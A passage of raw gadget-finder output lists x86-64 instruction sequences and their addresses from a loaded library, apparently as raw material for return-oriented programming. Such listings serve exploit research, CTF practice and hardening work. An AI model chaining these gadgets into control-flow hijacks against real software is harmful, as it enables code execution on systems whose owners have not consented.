0x00002aaaaab7f0df : movsxd rsi, dword ptr [rcx + rax*4] ; add rcx, rsi ; jmp rcx
0x00002aaaaab41a9d : movsxd rsi, dword ptr [rdi + rsi*4] ; add rdi, rsi ; jmp rdi
0x00002aaaaab0840e : movsxd rsi, dword ptr [rdi + rsi*4] ; add rsi, rdi ; jmp rsi
0x00002aaaaab996b0 : movsxd rsi, dword ptr [rdx + rsi*4] ; add rdx, rsi ; jmp rdx
0x00002aaaaac5e205 : movsxd rsi, ebp ; call qword ptr [rbx]
0x00002aaaaac5e2d9 : movsxd rsi, ebp ; call rsi
0x00002aaaaac5e2e9 : movsxd rsi, ebp ; push rbx ; cmc ; call qword ptr [rbx]
0x00002aaaaac6e369 : movsxd rsi, edi ; jmp rsp
0x00002aaaaac461cc : movsxd rsi, esi ; ret 0x7520
0x00002aaaaabd073a : movups xmm0, xmmword ptr [rax] ; add bl, al ; nop ; xor eax, eax ; ret
0x00002aaaaab0ffe9 : movups xmm0, xmmword ptr [rsp + 8] ; add rsp, 0x18 ; ret
0x00002aaaaab8fd49 : movups xmm0, xmmword ptr [rsp - 0x10] ; ret
0x00002aaaaab1f18e : movups xmm0, xmmword ptr [rsp - 4] ; ret
0x00002aaaaab1f1d4 : movups xmm0, xmmword ptr [rsp - 8] ; ret
0x00002aaaaab6eb47 : movups xmm1, xmmword ptr [rdi] ; xchg eax, ebx ; ret
0x00002aaaaab6eb46 : movups xmm9, xmmword ptr [rdi] ; xchg eax, ebx ; ret
0x00002aaaaab10171 : movups xmmword ptr [rbx], xmm0 ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaab0984e : movups xmmword ptr [rdi], xmm0 ; and rax, rdx ; movq xmm0, rax ; ret
0x00002aaaaab098c3 : movups xmmword ptr [rdi], xmm1 ; ret
0x00002aaaaab0988c : movups xmmword ptr [rdi], xmm1 ; subsd xmm0, xmm1 ; ret
0x00002aaaaab09c21 : movups xmmword ptr [rdi], xmm1 ; subss xmm0, xmm1 ; ret
0x00002aaaaac02b0d : movzx eax, al ; add rsp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac02aa7 : movzx eax, al ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaac0fc5b : movzx eax, al ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaac0262c : movzx eax, al ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaabbedfe : movzx eax, al ; cmova eax, edx ; ret
0x00002aaaaab8f635 : movzx eax, al ; lea eax, dword ptr [rax + rax - 1] ; ret
0x00002aaaaaba2006 : movzx eax, al ; lea rax, qword ptr [rax + rax - 1] ; ret
0x00002aaaaab0a22c : movzx eax, al ; mov dword ptr [rbx + 0x40], eax ; xor eax, eax ; pop rbx ; ret
0x00002aaaaaba83fe : movzx eax, al ; movsxd rax, dword ptr [rdi + rax*4] ; add rax, rdi ; jmp rax
0x00002aaaaab9533a : movzx eax, al ; movsxd rax, dword ptr [rdx + rax*4] ; add rdx, rax ; jmp rdx
0x00002aaaaab411cf : movzx eax, al ; movsxd rax, dword ptr [rsi + rax*4] ; add rax, rsi ; jmp rax
0x00002aaaaab412fe : movzx eax, al ; movsxd rax, dword ptr [rsi + rax*4] ; add rsi, rax ; jmp rsi
0x00002aaaaabe3010 : movzx eax, al ; neg eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab4034c : movzx eax, al ; neg eax ; pop rbx ; ret
0x00002aaaaab40319 : movzx eax, al ; neg eax ; ret
0x00002aaaaac07dd5 : movzx eax, al ; pop rbp ; pop r12 ; ret
0x00002aaaaac039fa : movzx eax, al ; pop rbx ; pop rbp ; ret
0x00002aaaaab9ba0b : movzx eax, al ; pop rbx ; ret
0x00002aaaaab0af29 : movzx eax, al ; ret
0x00002aaaaab63133 : movzx eax, al ; sar rdx, cl ; movzx edx, dl ; sub eax, edx ; ret
0x00002aaaaab02d15 : movzx eax, ax ; ret
0x00002aaaaab4cf32 : movzx eax, bh ; mov qword ptr [rsi + 0x28], rcx ; mov byte ptr [rdx], dil ; ret
0x00002aaaaab976a5 : movzx eax, bh ; movsxd r8, dword ptr [rdx + r8*4] ; add rdx, r8 ; jmp rdx
0x00002aaaaab463fd : movzx eax, bh ; ret
0x00002aaaaab4f78c : movzx eax, bpl ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab73b6d : movzx eax, byte ptr [rax + rcx] ; movzx edx, byte ptr [rdx + rcx] ; sub eax, edx ; ret
0x00002aaaaac0474e : movzx eax, byte ptr [rax + rdx] ; mov byte ptr [rdi + 7], al ; ret
0x00002aaaaab50fb6 : movzx eax, byte ptr [rax - 1] ; and dword ptr [rbx], 0xffffffef ; pop rbx ; ret
0x00002aaaaab4f60d : movzx eax, byte ptr [rax] ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab502d5 : movzx eax, byte ptr [rax] ; pop rbx ; ret
0x00002aaaaab4cf62 : movzx eax, byte ptr [rax] ; ret
0x00002aaaaaba95af : movzx eax, byte ptr [rdi + rax] ; mov r12, rdi ; xor eax, eax ; mov rdx, r8 ; jmp 0xd45e2
0x00002aaaaac1920b : movzx eax, byte ptr [rdi + rcx] ; movzx edx, byte ptr [rsi + rcx] ; sub eax, edx ; ret
0x00002aaaaab739ff : movzx eax, byte ptr [rdi + rdx] ; movzx edx, byte ptr [rsi + rdx] ; sub eax, edx ; ret
0x00002aaaaab5f578 : movzx eax, byte ptr [rdi + rdx] ; sub eax, ecx ; ret
0x00002aaaaac461f0 : movzx eax, byte ptr [rdi - 0x10] ; movzx edx, byte ptr [rsi - 0x10] ; sub eax, edx ; ret
0x00002aaaaac46250 : movzx eax, byte ptr [rdi - 0xa] ; movzx edx, byte ptr [rsi - 0xa] ; sub eax, edx ; ret
0x00002aaaaac46240 : movzx eax, byte ptr [rdi - 0xb] ; movzx edx, byte ptr [rsi - 0xb] ; sub eax, edx ; ret
0x00002aaaaac46230 : movzx eax, byte ptr [rdi - 0xc] ; movzx edx, byte ptr [rsi - 0xc] ; sub eax, edx ; ret
0x00002aaaaac46220 : movzx eax, byte ptr [rdi - 0xd] ; movzx edx, byte ptr [rsi - 0xd] ; sub eax, edx ; ret
0x00002aaaaac46210 : movzx eax, byte ptr [rdi - 0xe] ; movzx edx, byte ptr [rsi - 0xe] ; sub eax, edx ; ret
0x00002aaaaac46200 : movzx eax, byte ptr [rdi - 0xf] ; movzx edx, byte ptr [rsi - 0xf] ; sub eax, edx ; ret
0x00002aaaaac46702 : movzx eax, byte ptr [rdi - 1] ; cmp al, byte ptr [rsi - 1] ; jne 0x171730 ; xor eax, eax ; ret
0x00002aaaaac43710 : movzx eax, byte ptr [rdi - 1] ; movzx ecx, byte ptr [rsi - 1] ; sub eax, ecx ; ret
0x00002aaaaac434c3 : movzx eax, byte ptr [rdi - 1] ; movzx edx, byte ptr [rsi - 1] ; sub eax, edx ; ret
0x00002aaaaac461d7 : movzx eax, byte ptr [rdi - 9] ; movzx edx, byte ptr [rsi - 9] ; sub eax, edx ; ret
0x00002aaaaac42870 : movzx eax, byte ptr [rdi] ; movzx ecx, byte ptr [rsi] ; sub eax, ecx ; ret
0x00002aaaaab63110 : movzx eax, byte ptr [rdi] ; movzx edx, byte ptr [rsi] ; sub eax, edx ; ret
0x00002aaaaab5f593 : movzx eax, byte ptr [rdi] ; sub eax, ecx ; ret
0x00002aaaaab4f620 : movzx eax, byte ptr [rdx] ; ret
0x00002aaaaab4f78d : movzx eax, ch ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab7f037 : movzx eax, cl ; pop rbx ; ret
0x00002aaaaabed80d : movzx eax, dh ; or eax, edi ; bswap eax ; ret
0x00002aaaaab4cf31 : movzx eax, dil ; mov qword ptr [rsi + 0x28], rcx ; mov byte ptr [rdx], dil ; ret
0x00002aaaaab463fc : movzx eax, dil ; ret
0x00002aaaaab7f05f : movzx eax, dl ; pop rbx ; ret
0x00002aaaaabed81b : movzx eax, si ; or eax, edi ; bswap eax ; ret
0x00002aaaaabed80c : movzx eax, sil ; or eax, edi ; bswap eax ; ret
0x00002aaaaab030e5 : movzx eax, word ptr [rax + rdi*2 + 0x100] ; and eax, esi ; ret
0x00002aaaaab02e2e : movzx eax, word ptr [rax + rdi*2] ; and ax, 0x100 ; movzx eax, ax ; ret
0x00002aaaaab02e4e : movzx eax, word ptr [rax + rdi*2] ; and ax, 0x1000 ; movzx eax, ax ; ret
0x00002aaaaab02d8e : movzx eax, word ptr [rax + rdi*2] ; and ax, 0x200 ; movzx eax, ax ; ret
0x00002aaaaab02e0e : movzx eax, word ptr [rax + rdi*2] ; and ax, 0x2000 ; movzx eax, ax ; ret
0x00002aaaaab02d2e : movzx eax, word ptr [rax + rdi*2] ; and ax, 0x400 ; movzx eax, ax ; ret
0x00002aaaaab02dce : movzx eax, word ptr [rax + rdi*2] ; and ax, 0x4000 ; movzx eax, ax ; ret
0x00002aaaaab02d6e : movzx eax, word ptr [rax + rdi*2] ; and ax, 0x800 ; movzx eax, ax ; ret
0x00002aaaaab02dae : movzx eax, word ptr [rax + rdi*2] ; and ax, 0x8000 ; movzx eax, ax ; ret
0x00002aaaaab02ece : movzx eax, word ptr [rax + rdi*2] ; and eax, 1 ; ret
0x00002aaaaab02d4e : movzx eax, word ptr [rax + rdi*2] ; and eax, 2 ; movzx eax, ax ; ret
0x00002aaaaab02dee : movzx eax, word ptr [rax + rdi*2] ; and eax, 4 ; movzx eax, ax ; ret
0x00002aaaaab02d0e : movzx eax, word ptr [rax + rdi*2] ; and eax, 8 ; movzx eax, ax ; ret
0x00002aaaaabe8e32 : movzx eax, word ptr [rax + rdx*2] ; shr ax, 0xe ; and eax, 1 ; ret
0x00002aaaaabca350 : movzx eax, word ptr [rdi] ; mov word ptr [rsi], ax ; xor eax, eax ; ret
0x00002aaaaabadf61 : movzx ebp, bpl ; movsxd rdx, dword ptr [rax + rbp*4] ; add rax, rdx ; jmp rax
0x00002aaaaabadf62 : movzx ebp, ch ; movsxd rdx, dword ptr [rax + rbp*4] ; add rax, rdx ; jmp rax
0x00002aaaaab7e5aa : movzx ecx, byte ptr [rsi + rdx + 3] ; test cl, cl ; jne 0xa95a9 ; ret
0x00002aaaaab7e65a : movzx ecx, byte ptr [rsi + rdx + 3] ; test cl, cl ; jne 0xa9659 ; ret
0x00002aaaaab5f574 : movzx ecx, byte ptr [rsi + rdx] ; movzx eax, byte ptr [rdi + rdx] ; sub eax, ecx ; ret
0x00002aaaaac43714 : movzx ecx, byte ptr [rsi - 1] ; sub eax, ecx ; ret
0x00002aaaaab5f590 : movzx ecx, byte ptr [rsi] ; movzx eax, byte ptr [rdi] ; sub eax, ecx ; ret
0x00002aaaaac42873 : movzx ecx, byte ptr [rsi] ; sub eax, ecx ; ret
0x00002aaaaabdb974 : movzx edi, bh ; shr rax, 0xc ; xor al, al ; or eax, edi ; ret
0x00002aaaaabb5e94 : movzx edi, byte ptr [rax + 8] ; movsxd rdi, dword ptr [r11 + rdi*4] ; add rdi, r11 ; jmp rdi
0x00002aaaaabdce82 : movzx edi, di ; mov eax, dword ptr [rax + rdi*4] ; ret
0x00002aaaaab08bcf : movzx edx, byte ptr [rdi] ; test dl, dl ; jne 0x33bb7 ; ret
0x00002aaaaab73b71 : movzx edx, byte ptr [rdx + rcx] ; sub eax, edx ; ret
0x00002aaaaac1920f : movzx edx, byte ptr [rsi + rcx] ; sub eax, edx ; ret
0x00002aaaaab73a03 : movzx edx, byte ptr [rsi + rdx] ; sub eax, edx ; ret
0x00002aaaaac461f4 : movzx edx, byte ptr [rsi - 0x10] ; sub eax, edx ; ret
0x00002aaaaac46254 : movzx edx, byte ptr [rsi - 0xa] ; sub eax, edx ; ret
0x00002aaaaac46244 : movzx edx, byte ptr [rsi - 0xb] ; sub eax, edx ; ret
0x00002aaaaac46234 : movzx edx, byte ptr [rsi - 0xc] ; sub eax, edx ; ret
0x00002aaaaac46224 : movzx edx, byte ptr [rsi - 0xd] ; sub eax, edx ; ret
0x00002aaaaac46214 : movzx edx, byte ptr [rsi - 0xe] ; sub eax, edx ; ret
0x00002aaaaac46204 : movzx edx, byte ptr [rsi - 0xf] ; sub eax, edx ; ret
0x00002aaaaac2f6a0 : movzx edx, byte ptr [rsi - 1] ; mov byte ptr [rdi - 1], dl ; ret
0x00002aaaaac434c7 : movzx edx, byte ptr [rsi - 1] ; sub eax, edx ; ret
0x00002aaaaac461db : movzx edx, byte ptr [rsi - 9] ; sub eax, edx ; ret
0x00002aaaaac2fd80 : movzx edx, byte ptr [rsi] ; mov byte ptr [rdi], dl ; ret
0x00002aaaaab63113 : movzx edx, byte ptr [rsi] ; sub eax, edx ; ret
0x00002aaaaab9762a : movzx edx, cl ; movsxd rdx, dword ptr [rax + rdx*4] ; add rax, rdx ; jmp rax
0x00002aaaaabb56af : movzx edx, dh ; movsxd rdx, dword ptr [rcx + rdx*4] ; add rdx, rcx ; jmp rdx
0x00002aaaaab63139 : movzx edx, dl ; sub eax, edx ; ret
0x00002aaaaabb56ae : movzx edx, sil ; movsxd rdx, dword ptr [rcx + rdx*4] ; add rdx, rcx ; jmp rdx
0x00002aaaaac2f620 : movzx edx, word ptr [rsi - 2] ; mov word ptr [rdi - 2], dx ; ret
0x00002aaaaac2fd10 : movzx edx, word ptr [rsi] ; mov word ptr [rdi], dx ; ret
0x00002aaaaab80f51 : movzx esi, bl ; mov rdi, qword ptr [rbp] ; call r12
0x00002aaaaab7316c : movzx esi, byte ptr [rcx] ; test sil, sil ; jne 0x9e16b ; mov qword ptr [rdx], rcx ; ret
0x00002aaaaab0840b : movzx esi, dh ; movsxd rsi, dword ptr [rdi + rsi*4] ; add rsi, rdi ; jmp rsi
0x00002aaaaab0840a : movzx esi, sil ; movsxd rsi, dword ptr [rdi + rsi*4] ; add rsi, rdi ; jmp rsi
0x00002aaaaab311ea : movzx esp, ah ; movsxd rcx, dword ptr [rax + r12*4] ; add rax, rcx ; jmp rax
0x00002aaaaab31417 : movzx esp, ah ; movsxd rdx, dword ptr [rax + r12*4] ; add rax, rdx ; jmp rax
0x00002aaaaab311e9 : movzx r12d, r12b ; movsxd rcx, dword ptr [rax + r12*4] ; add rax, rcx ; jmp rax
0x00002aaaaab31416 : movzx r12d, r12b ; movsxd rdx, dword ptr [rax + r12*4] ; add rax, rdx ; jmp rax
0x00002aaaaab976a4 : movzx r8d, dil ; movsxd r8, dword ptr [rdx + r8*4] ; add rdx, r8 ; jmp rdx
0x00002aaaaabccd74 : movzx rax, al ; ret
0x00002aaaaac69440 : mul byte ptr [rdi - 0x57790003] ; std ; jmp qword ptr [rsi]
0x00002aaaaab61977 : mul byte ptr [rsi + 0xf] ; outsd dx, dword ptr [rsi] ; push rdi ; xor byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret
0x00002aaaaac5acbc : mul dword ptr [rbp - 0x13] ; call rdx
0x00002aaaaabdda41 : mul dword ptr [rdi + 0x2002b] ; add byte ptr [rax], al ; pop rbp ; ret
0x00002aaaaac42c95 : mul dword ptr [rsi + 2] ; add byte ptr [rcx + 0x63], cl ; or al, 0x93 ; add rcx, r11 ; jmp rcx
0x00002aaaaab111ae : mulps xmm0, xmm0 ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab09951 : mulps xmm1, xmm0 ; movapd xmm0, xmm1 ; ret
0x00002aaaaab09cdf : mulps xmm1, xmm0 ; movaps xmm0, xmm1 ; ret
0x00002aaaaab1446d : mulsd xmm0, xmm0 ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab09950 : mulsd xmm1, xmm0 ; movapd xmm0, xmm1 ; ret
0x00002aaaaab111ad : mulss xmm0, xmm0 ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab09cde : mulss xmm1, xmm0 ; movaps xmm0, xmm1 ; ret
0x00002aaaaab43797 : neg byte ptr [rbp + 0x41] ; pop rsp ; pop r13 ; pop r14 ; ret
0x00002aaaaac0b16f : neg eax ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaac0b7ba : neg eax ; add rsp, 0x28 ; pop rbx ; pop rbp ; ret
0x00002aaaaabbed60 : neg eax ; mov dword ptr fs:[rax], r8d ; mov eax, 0xffffffff ; ret
0x00002aaaaab0a777 : neg eax ; mov dword ptr fs:[rcx], eax ; or rax, 0xffffffffffffffff ; ret
0x00002aaaaab4d95e : neg eax ; mov dword ptr fs:[rdx], eax ; mov eax, 0xffffffff ; pop rbx ; ret
0x00002aaaaab0a457 : neg eax ; mov dword ptr fs:[rdx], eax ; mov eax, 0xffffffff ; ret
0x00002aaaaabfd6bc : neg eax ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaabe3013 : neg eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab4034f : neg eax ; pop rbx ; ret
0x00002aaaaaaf621d : neg eax ; ret
0x00002aaaaab5c951 : neg ebx ; add rsp, 0x10 ; mov eax, ebx ; pop rbx ; ret
0x00002aaaaab09b65 : neg ecx ; or eax, ecx ; sar eax, 0x1f ; not eax ; and eax, edx ; ret
0x00002aaaaab528c5 : neg edi ; call qword ptr [r15]
0x00002aaaaab1ac41 : neg edx ; add rsp, 8 ; mov eax, edx ; pop rbx ; pop rbp ; ret
0x00002aaaaabcba91 : neg edx ; cmp dword ptr [rsp - 0x58], 2 ; cmove eax, edx ; ret
0x00002aaaaabbedb7 : neg edx ; mov dword ptr fs:[rax], edx ; mov eax, 0xffffffff ; ret
0x00002aaaaab528c4 : neg rdi ; call qword ptr [r15]
0x00002aaaaabb8378 : nop ; add al, 0xf ; xchg eax, esp ; ret 0x9848
0x00002aaaaab48ed8 : nop ; add byte ptr [rax], 0 ; add byte ptr [rax - 0x39], cl ; ret 0xffff
0x00002aaaaab4f3dc : nop ; add byte ptr [rax], 0 ; add byte ptr [rax - 0x77], cl ; ret 0xffb8
0x00002aaaaabf17f8 : nop ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; fcomp dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x00002aaaaac2edd7 : nop ; add byte ptr [rax], al ; add byte ptr [rax - 0x7f], cl ; ret 0x80
0x00002aaaaab0aa93 : nop ; add byte ptr [rax], al ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x00002aaaaabd59ee : nop ; add byte ptr [rax], al ; add byte ptr [rcx + 0x415d5bd8], cl ; pop rsp ; ret
0x00002aaaaabf174a : nop ; add byte ptr [rax], al ; add byte ptr [rcx], dh ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0x00002aaaaaafac54 : nop ; add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov dh, 0x4a ; dec dword ptr [rax - 0x7d] ; ret 0x4801
0x00002aaaaac42b7c : nop ; add byte ptr [rax], al ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaaaf8ff3 : nop ; add byte ptr [rax], al ; add dh, dh ; ret 0x4801
0x00002aaaaabd195d : nop ; add dword ptr [rax], eax ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x00002aaaaab96682 : nop ; add dword ptr [rax], eax ; add byte ptr [rcx], ch ; ret
0x00002aaaaac7585d : nop ; add dword ptr [rsi + rcx + 0x10], ecx ; je 0x1a0875 ; ret
0x00002aaaaac7586b : nop ; add dword ptr [rsi + rcx + 0x10], ecx ; ret
0x00002aaaaac31027 : nop ; add eax, dword ptr [rax] ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac79cc0 : nop ; add esi, ebp ; call qword ptr [rsi]
0x00002aaaaab20605 : nop ; add rax, rdi ; jmp rax
0x00002aaaaab30f55 : nop ; add rax, rdx ; jmp rax
0x00002aaaaab7f0aa : nop ; add rax, rsi ; jmp rax
0x00002aaaaab8e45f : nop ; add rsp, 0x10 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab3fc4f : nop ; add rsp, 0x28 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaaaf6a2f : nop ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab4cd4f : nop ; add rsp, 8 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaac69b40 : nop ; and ah, bh ; jmp rax
0x00002aaaaab4a8bf : nop ; and ecx, 0xffffffcf ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaac86d90 : nop ; and esi, esi ; jmp qword ptr [rsi]
0x00002aaaaabb270c : nop ; and esp, esi ; dec dword ptr [rcx - 0x77] ; ret 0x8949
0x00002aaaaab62f6f : nop ; bsf eax, eax ; lea rax, qword ptr [rax + rdi - 0x10] ; ret
0x00002aaaaab7351f : nop ; bsr eax, eax ; add rax, rdi ; ret
0x00002aaaaab736af : nop ; bsr eax, eax ; lea rax, qword ptr [rax + rdi + 0x10] ; ret
0x00002aaaaac82230 : nop ; cdq ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac6aa3d : nop ; cld ; call rax
0x00002aaaaabe770f : nop ; cmp edi, 0x56 ; je 0x11272b ; mov eax, 7 ; ret
0x00002aaaaab0a12f : nop ; fstp st(1) ; add rsp, 8 ; ret
0x00002aaaaac81dc1 : nop ; hlt ; call qword ptr [rcx]
0x00002aaaaac81da9 : nop ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac835a0 : nop ; hlt ; jmp qword ptr [rsi]
0x00002aaaaac5d540 : nop ; hlt ; jmp rax
0x00002aaaaac69974 : nop ; hlt ; sti ; jmp rax
0x00002aaaaac7a2b0 : nop ; in al, -4 ; call qword ptr [rdx]
0x00002aaaaac6962c : nop ; in eax, -5 ; jmp qword ptr [rax]
0x00002aaaaac790b1 : nop ; in eax, dx ; call qword ptr [rdx]
0x00002aaaaac77c60 : nop ; in eax, dx ; jmp qword ptr [rax]
0x00002aaaaac69920 : nop ; in eax, dx ; sti ; jmp rax
0x00002aaaaac49c90 : nop ; jb 0x174c81 ; call rax
0x00002aaaaab0a2ef : nop ; jmp rdx
0x00002aaaaac6ccc9 : nop ; jmp rsp
0x00002aaaaac69628 : nop ; jrcxz 0x19462d ; call qword ptr [rax + 0x20fffbe5]
0x00002aaaaac6a97c : nop ; lahf ; cld ; call qword ptr [rax]
0x00002aaaaabf742f : nop ; lea eax, dword ptr [rdi + 9] ; and eax, 0xfffffff8 ; add eax, 0x10 ; ret
0x00002aaaaab254bf : nop ; lea eax, dword ptr [rdi - 1] ; xor edx, edx ; div ecx ; add eax, r8d ; ret
0x00002aaaaab2b9f4 : nop ; lea rax, qword ptr [rip - 0x2fa] ; add rax, rdx ; jmp rax
0x00002aaaaab2e876 : nop ; lea rcx, qword ptr [rip - 0x7cc] ; add rax, rcx ; jmp rax
0x00002aaaaab2050f : nop ; lea rdi, qword ptr [rip + 0x1445f1] ; call 0x777fa
0x00002aaaaab2050e : nop ; lea rdi, qword ptr [rip + 0x1445f1] ; call 0x777fb
0x00002aaaaab23615 : nop ; lea rsi, qword ptr [rip + 0x1304] ; add rax, rsi ; jmp rax
0x00002aaaaabadf6f : nop ; mov byte ptr [rdi + 8], 2 ; xor eax, eax ; ret
0x00002aaaaac26fff : nop ; mov dl, byte ptr [rsi - 1] ; mov byte ptr [rdi - 1], dl ; ret
0x00002aaaaabe9c1f : nop ; mov dword ptr [r8], edx ; xor eax, eax ; ret
0x00002aaaaac271df : nop ; mov dx, word ptr [rsi - 2] ; mov word ptr [rdi - 2], dx ; ret
0x00002aaaaabcb2ef : nop ; mov eax, 0x5f ; syscall ; ret
0x00002aaaaabed75f : nop ; mov eax, 0xca ; add rsp, 0x28 ; ret
0x00002aaaaaba1e5f : nop ; mov eax, 0xfffa ; ret
0x00002aaaaab4706f : nop ; mov eax, 0xffffffff ; ret
0x00002aaaaab811bf : nop ; mov eax, 1 ; ret
0x00002aaaaabe8d67 : nop ; mov eax, dword ptr [r14 + 0x18] ; mov dword ptr [rbp - 0x80], eax ; call r9
0x00002aaaaabe81df : nop ; mov eax, dword ptr [rbx + 0x60] ; mov dword ptr [rbp - 0x80], eax ; call rcx
0x00002aaaaab8004f : nop ; mov eax, dword ptr [rdi + 0x2c] ; cmp eax, dword ptr [rsi + 0x2c] ; jne 0xab0b9 ; ret
0x00002aaaaab8004e : nop ; mov eax, dword ptr [rdi + 0x2c] ; cmp eax, dword ptr [rsi + 0x2c] ; jne 0xab0ba ; ret
0x00002aaaaab8009f : nop ; mov eax, dword ptr [rdi + 0x3c] ; cmp eax, dword ptr [rsi + 0x3c] ; jne 0xab0b9 ; ret
0x00002aaaaab8009e : nop ; mov eax, dword ptr [rdi + 0x3c] ; cmp eax, dword ptr [rsi + 0x3c] ; jne 0xab0ba ; ret
0x00002aaaaabab60f : nop ; mov eax, dword ptr [rdi + 0x4c] ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaabd071f : nop ; mov eax, dword ptr [rdi + 8] ; and eax, 0x100f ; ret
0x00002aaaaab4ceff : nop ; mov eax, dword ptr [rdi] ; shr eax, 4 ; and eax, 1 ; ret
0x00002aaaaab0b86f : nop ; mov eax, dword ptr [rip + 0x38c816] ; ret
0x00002aaaaabdf1bf : nop ; mov eax, edi ; ret
0x00002aaaaabed7af : nop ; mov eax, edi ; ror ax, 8 ; ret
0x00002aaaaab0b8cf : nop ; mov eax, edx ; ret
0x00002aaaaabe871f : nop ; mov edx, dword ptr [r13 + 0x18] ; mov dword ptr [rbp - 0x80], edx ; mov rdx, r14 ; call rax
0x00002aaaaabe8631 : nop ; mov edx, dword ptr [r13 + 0x18] ; mov dword ptr [rbp - 0x80], edx ; mov rdx, rbx ; call rax
0x00002aaaaabe82ae : nop ; mov edx, dword ptr [r13 - 0x30] ; mov dword ptr [rbp - 0x80], edx ; mov rdx, rbx ; call rax
0x00002aaaaabe8939 : nop ; mov edx, dword ptr [r14 + 0x18] ; mov dword ptr [rbp - 0x80], edx ; mov rdx, rbx ; call rax
0x00002aaaaabe8786 : nop ; mov edx, dword ptr [rbx + 0x18] ; mov dword ptr [rbp - 0x80], edx ; mov rdx, r12 ; call rax
0x00002aaaaabe8c4c : nop ; mov edx, dword ptr [rbx + 0x60] ; mov dword ptr [rbp - 0x80], edx ; mov rdx, r13 ; call rax
0x00002aaaaac2759f : nop ; mov edx, dword ptr [rsi - 4] ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaab7b7af : nop ; mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; lea rax, qword ptr [rdi + 3] ; ret
0x00002aaaaab4d32f : nop ; mov rax, -1 ; pop rbx ; ret
0x00002aaaaab50f3f : nop ; mov rax, -1 ; ret
0x00002aaaaab4c4cf : nop ; mov rax, qword ptr [rdi + 0x28] ; sub rax, qword ptr [rdi + 0x20] ; ret
0x00002aaaaab4c3bf : nop ; mov rax, qword ptr [rdi + 0x40] ; sub rax, qword ptr [rdi + 0x38] ; ret
0x00002aaaaac0eebf : nop ; mov rax, qword ptr [rdi + 8] ; mov rax, qword ptr [rax + 8] ; jmp rax
0x00002aaaaac0ef9f : nop ; mov rax, qword ptr [rdi + 8] ; mov rsi, rsp ; call qword ptr [rax]
0x00002aaaaabf53df : nop ; mov rax, qword ptr [rip + 0x2a4491] ; ret
0x00002aaaaabde74f : nop ; mov rax, qword ptr [rip + 0x2b9719] ; mov eax, dword ptr [rax + 0x38] ; ret
0x00002aaaaaba5bbf : nop ; mov rax, r12 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab52398 : nop ; mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab730bf : nop ; mov rax, rdi ; ret
0x00002aaaaab7b7ff : nop ; mov rdx, qword ptr [rsi] ; mov qword ptr [rdi], rdx ; lea rax, qword ptr [rdi + 7] ; ret
0x00002aaaaab7c62f : nop ; mov rdx, qword ptr [rsi] ; mov qword ptr [rdi], rdx ; lea rax, qword ptr [rdi + 8] ; ret
0x00002aaaaabe8b15 : nop ; mov rdx, r13 ; call rax
0x00002aaaaab0c33f : nop ; mov rdx, r13 ; mov rsi, r12 ; mov rdi, rbp ; call r15
0x00002aaaaab593ff : nop ; mov rsi, qword ptr [rsp + 0x28] ; mov rdi, rbp ; call rax
0x00002aaaaabca36f : nop ; mov word ptr [rdi], si ; xor eax, eax ; ret
0x00002aaaaac6a974 : nop ; movabs al, byte ptr [0x9f90fffca010fffc] ; cld ; call qword ptr [rax]
0x00002aaaaac693c0 : nop ; movabs al, byte ptr [0xa230fffda140fffd] ; std ; jmp qword ptr [rax]
0x00002aaaaab47fe2 : nop ; movabs al, byte ptr [0xeb407a8b48000000] ; ret
0x00002aaaaac6a964 : nop ; movabs byte ptr [0xa190fffca210fffc], al ; cld ; call qword ptr [rax]
0x00002aaaaac6a95c : nop ; movabs dword ptr [0xa290fffca310fffc], eax ; cld ; call qword ptr [rax]
0x00002aaaaac694a0 : nop ; movabs dword ptr [0xa490fffda410fffd], eax ; std ; call qword ptr [rax]
0x00002aaaaac6a96c : nop ; movabs eax, dword ptr [0xa090fffca110fffc] ; cld ; call qword ptr [rax]
0x00002aaaaac69498 : nop ; movabs eax, dword ptr [0xa390fffda290fffd] ; std ; call qword ptr [rax]
0x00002aaaaab7a26f : nop ; movdqu xmm0, xmmword ptr [rsi] ; movdqu xmmword ptr [rdi], xmm0 ; ret
0x00002aaaaac6a994 : nop ; movsb byte ptr [rdi], byte ptr [rsi] ; cld ; call qword ptr [rax]
